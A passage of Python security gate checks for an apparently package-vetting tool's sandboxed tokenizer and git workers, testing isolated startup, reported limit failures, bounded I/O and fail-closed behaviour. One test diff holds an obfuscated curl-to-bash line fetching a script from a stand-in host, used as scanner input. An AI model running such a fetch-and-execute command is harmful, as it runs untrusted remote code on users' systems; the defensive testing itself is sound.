    so a writable directory on it let a ``sitecustomize.py`` run before the
    worker applied its limits.  The worker must be launched ``-I`` (isolated)
    with no ``PYTHON*`` variables in its environment.
    """
    from trustsight.sandbox import client

    problems: list[str] = []
    args = client._launch_args()
    if "-I" not in args:
        problems.append("worker is not launched isolated (-I)")
    env = client._child_env()
    leaked = sorted(k for k in env if k.startswith("PYTHON"))
    if leaked:
        problems.append(f"worker environment carries PYTHON* vars: {leaked}")
    return Gate("tokenizer worker startup is isolated", not problems,
                problems or "isolated (-I), no PYTHON* env")

def gate_git_worker_startup_is_isolated() -> Gate:
    """A16: the git worker's own startup cannot import an attacker's code.

    Same launch rule as the tokenizer worker, through the shared spawn helper:
    an isolated interpreter (``-I``) and a minimal environment, so a writable
    directory on ``PYTHONPATH`` cannot run a ``sitecustomize.py`` before the
    worker applies its limits.  The worker module itself is fixed here rather
    than taken from the caller.
    """
    import inspect

    from trustsight.sandbox import _spawn, git_client
    from trustsight.subproc import minimal_env

    problems: list[str] = []
    args = _spawn.launch_args(git_client._WORKER_MODULE)
    if "-I" not in args:
        problems.append("the git worker is not launched isolated (-I)")
    if git_client._WORKER_MODULE != "trustsight.sandbox.git_worker":
        problems.append("the git worker module name changed")
    leaked = sorted(k for k in minimal_env() if k.startswith("PYTHON"))
    if leaked:
        problems.append(f"the git worker environment carries PYTHON* vars: {leaked}")
    if "env=minimal_env()" not in inspect.getsource(_spawn.spawn_isolated):
        problems.append("the git worker does not get a minimal environment")
    return Gate("git worker startup is isolated", not problems,
                problems or "isolated (-I), minimal env")

def gate_git_worker_limit_failures_are_reported() -> Gate:
    """A16: a resource limit that fails to apply is reported, not swallowed.

    The git worker is a resource-bounded subprocess, not an OS sandbox, so a
    ``setrlimit`` or ``PR_SET_NO_NEW_PRIVS`` that fails leaves the isolation
    weaker than the design intends.  That must surface to the parent (the
    ``degraded`` field) rather than vanish into a bare ``except: pass``.
    """
    from unittest.mock import patch

    from trustsight.sandbox import git_worker

    problems: list[str] = []
    with patch.object(git_worker.resource, "setrlimit",
                      side_effect=OSError("denied")), \
            patch.object(git_worker.ctypes, "CDLL",
                         side_effect=AttributeError("no libc")):
        failures = git_worker._apply_limits()
    if len(failures) != 5:
        problems.append(f"expected five reported failures, got {len(failures)}")
    if not any("RLIMIT_AS" in f for f in failures):
        problems.append("an rlimit failure was not named")
    if not any("PR_SET_NO_NEW_PRIVS" in f for f in failures):
        problems.append("a NO_NEW_PRIVS failure was not named")

    # The libgit2 settings are the other half of A16, and they were once
    # swallowed the same way.  A settings object that refuses every write
    # must produce four named failures, not an empty list.
    class _RefusingSettings:
        def __setattr__(self, name, value):
            raise ValueError("denied")

        def enable_strict_object_creation(self, value=True):
            raise ValueError("denied")

        def enable_strict_hash_verification(self, value=True):
            raise ValueError("denied")

    with patch.object(git_worker.pygit2, "settings", _RefusingSettings()), \
            patch.object(git_worker.tempfile, "mkdtemp",
                         return_value="/tmp/trustsight-gate-home"), \
            patch.object(git_worker.atexit, "register"):
        hardened = git_worker._harden_libgit2()
    if len(hardened) != 4:
        problems.append(
            f"expected four reported libgit2 failures, got {len(hardened)}")
    for name in ("pack object ceiling", "strict object creation",
                 "strict hash verification"):
        if not any(name in f for f in hardened):
            problems.append(f"a libgit2 setting failure was not named: {name}")
    return Gate("git worker limit failures are reported", not problems,
                problems or "limit and libgit2 failures are returned, not swallowed")

def gate_tokenizer_worker_limit_failures_are_reported() -> Gate:
    """A6: the tokenizer worker's failed limits surface, not vanish.

    Same rule as the git worker: a ``setrlimit`` or
    ``PR_SET_NO_NEW_PRIVS`` that did not take effect leaves the sandbox
    weaker than the design intends, and the parent must be able to say so
    rather than infer protection from silence.
    """
    from unittest.mock import patch

    from trustsight.sandbox import expand_worker

    problems: list[str] = []
    with patch.object(expand_worker.resource, "setrlimit",
                      side_effect=OSError("denied")), \
            patch.object(expand_worker.ctypes, "CDLL",
                         side_effect=AttributeError("no libc")), \
            patch.object(expand_worker, "_report_isolation", lambda *a: None):
        failures = expand_worker._apply_limits()
    if len(failures) != 5:
        problems.append(f"expected five reported failures, got {len(failures)}")
    if not any("RLIMIT_AS" in f for f in failures):
        problems.append("an rlimit failure was not named")
    if not any("PR_SET_NO_NEW_PRIVS" in f for f in failures):
        problems.append("a NO_NEW_PRIVS failure was not named")
    return Gate("tokenizer worker limit failures are reported", not problems,
                problems or "failures are returned, not swallowed")

def gate_sandbox_core_limit_failure_refuses() -> Gate:
    """A6/A16/B2: losing a core protection is a refusal, not a verdict.

    Reporting a failed ``setrlimit`` is not enough: a worker that cannot set
    address space, CPU or ``PR_SET_NO_NEW_PRIVS`` must not analyse a package
    with weaker confinement than the verdict claims.  Secondary limits and
    libgit2 settings remain ``degraded``; the core three refuse.
    """
    from unittest.mock import patch

    from trustsight.sandbox import _spawn, expand_worker, git_worker

    problems: list[str] = []
    core = ["RLIMIT_AS not applied: OSError"]
    if _spawn.core_sandbox_failures(core) != core:
        problems.append("a core limit failure was not classified as fatal")
    if _spawn.core_sandbox_failures([
        "RLIMIT_FSIZE not applied: OSError",
        "RLIMIT_NOFILE not applied: OSError",
    ]):
        problems.append("a secondary limit failure was classified as fatal")

    for module, label in ((expand_worker, "tokenizer"), (git_worker, "git")):
        with patch.object(module, "_apply_limits", return_value=core), \
                contextlib.redirect_stderr(io.StringIO()):
            code = module.main()
        if code == 0:
            problems.append(f"the {label} worker served after a core failure")
    return Gate("sandbox core limit failure refuses the package", not problems,
                problems or "core failures exit before serving")

def gate_tokenizer_request_writes_are_bounded() -> Gate:
    """A4/A14: a request is capped, and its write has a deadline.

    A child that stops reading stdin must not hold the parent in a blocking
    ``write``, and an over-cap frame must be refused where the reason is
    still known rather than by the worker exiting.  Every sandbox request -
    tokenizer and git - caps the frame and goes through the bounded writer.
    """
    import inspect

    from trustsight.sandbox import client, git_client, protocol

    problems: list[str] = []
    for module in (client, git_client):
        source = inspect.getsource(module)
        if ".stdin.write(" in source:
            problems.append(
                f"{module.__name__} still writes to stdin directly"
            )
        if "protocol.write_frame(" not in source:
            problems.append(
                f"{module.__name__} does not use the bounded frame writer"
            )
        if "MAX_FRAME_BYTES" not in source:
            problems.append(
                f"{module.__name__} does not cap the request frame before writing"
            )
    writer = inspect.getsource(protocol.write_frame)
    for required in ("deadline", "select.select", "os.write"):
        if required not in writer:
            problems.append(f"write_frame lacks {required}")
    return Gate("tokenizer request writes are bounded", not problems,
                problems or "writes are select-bounded")

def gate_sandbox_responses_are_capped_before_framing() -> Gate:
    """A4/A14: both workers refuse an over-cap response while serialising.

    The parent's response-read cap fires after the child has already built
    and framed the whole payload.  The cap therefore belongs in the child,
    while the body is serialised and before it is framed, and both workers
    share one implementation so they cannot drift.  Behaviour is checked
    too: naming the shared helper is not enough if the caller still builds
    the whole body first.
    """
    import inspect
    from unittest.mock import patch

    from trustsight.sandbox import expand_worker, git_worker, protocol

    problems: list[str] = []
    shared = inspect.getsource(protocol.encode_response)
    for required in ("iterencode", "MAX_RESPONSE_BYTES", "_response_too_large"):
        if required not in shared:
            problems.append(f"encode_response lacks {required}")

    for module in (expand_worker, git_worker):
        main_source = inspect.getsource(module.main)
        if "protocol.frame(" not in main_source \
                or "_encode_response(" not in main_source:
            problems.append(
                f"{module.__name__}.main does not frame the capped encoder")
        if "protocol.encode(response)" in main_source:
            problems.append(
                f"{module.__name__}.main uses the legacy uncapped encode path")
        encoder_source = inspect.getsource(module._encode_response)
        if "protocol.encode_response(" not in encoder_source:
            problems.append(
                f"{module.__name__} does not delegate to encode_response")

    with patch.object(protocol, "MAX_RESPONSE_BYTES", 1024):
        huge = {"result": "x" * 10_000}
        small = {"result": "ok"}
        refusals = {
            module.__name__: module._encode_response(huge)
            for module in (expand_worker, git_worker)
        }
        for name, body in refusals.items():
            if b"response exceeds" not in body:
                problems.append(f"{name} did not refuse an oversized response")
            if b"xxxx" in body:
                problems.append(f"{name} carried the oversized payload")
        if len(set(refusals.values())) != 1:
            problems.append("the two workers refuse with different bodies")
        for module in (expand_worker, git_worker):
            if b'"result"' not in module._encode_response(small):
                problems.append(f"{module.__name__} refused a small response")
    return Gate("sandbox responses are capped before framing", not problems,
                problems or "both workers cap during serialisation")

def gate_tokenizer_pool_wait_is_bounded() -> Gate:
    """A6/A14: a saturated pool refuses at a deadline, never blocks forever.

    The pool saturates at ``WORKER_POOL_SIZE``; past that the caller waits
    for a checked-out worker.  That wait must carry a finite timeout, so a
    single wedged holder cannot hang the whole review.
    """
    import queue
    from types import SimpleNamespace
    from unittest.mock import patch

    from trustsight.sandbox import client

    problems = []
    occupied = [object() for _ in range(client.WORKER_POOL_SIZE)]
    observed = []

    def bounded_wait(timeout=None):
        if timeout is None:
            raise AssertionError("unbounded pool wait")
        if not 0 < timeout <= client.REQUEST_TIMEOUT_SECONDS:
            raise AssertionError(f"invalid pool timeout: {timeout}")
        observed.append(timeout)

    with patch.multiple(client, _pool=queue.Queue(), _all=occupied,
                        _Worker=lambda: SimpleNamespace(start=lambda: None)), \
            patch.object(client._lock, "wait", bounded_wait), \
            patch.object(client.time, "monotonic",
                         side_effect=[0.0, 0.0, client.REQUEST_TIMEOUT_SECONDS + 1.0]):
        try:
            client._acquire()
        except client.TokenizerUnavailable:
            pass
        except Exception as exc:
            problems.append(f"pool timeout: {exc}")
        else:
            problems.append("saturated pool did not refuse at its deadline")
    if not observed:
        problems.append("saturated pool never waited with a bounded timeout")
    return Gate("tokenizer pool waits are bounded", not problems,
                problems or "a saturated pool refuses at a bounded deadline")

def gate_dead_tokenizer_child_fails_the_package() -> Gate:
    """A6/B2: a child that cannot answer yields NOT vetted, not a quiet run.

    The facade raises :class:`TokenizerUnavailable`; the batch runner
    already turns any exception into a result carrying ``failed: True`` and
    a verdict saying the package was NOT vetted.  This forces the spawn to
    fail and proves the real ``scan_diff`` path reaches that raise instead
    of completing with the parser missing.
    """
    from trustsight.analysis.pipeline import scan_diff
    from trustsight.sandbox import client
    from trustsight.tokenizer import TokenizerUnavailable

    diff = (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,3 @@\n"
        "+C=curl\n+$C https://example.invalid/x | bash\n"
    )
    problems: list[str] = []
    original = client._acquire

    def dead():
        raise TokenizerUnavailable("tokenizer_unavailable: forced for the gate")

    client._acquire = dead
    try:
        scan_diff(diff, package_name="sandbox-gate")
    except TokenizerUnavailable:
        pass
    except Exception as exc:
        problems.append(f"wrong exception: {type(exc).__name__}: {exc}")
    else:
        problems.append("analysis completed with no tokenizer child")
    finally:
        client._acquire = original
    return Gate("a dead tokenizer child fails the package", not problems,
                problems or "raises TokenizerUnavailable")
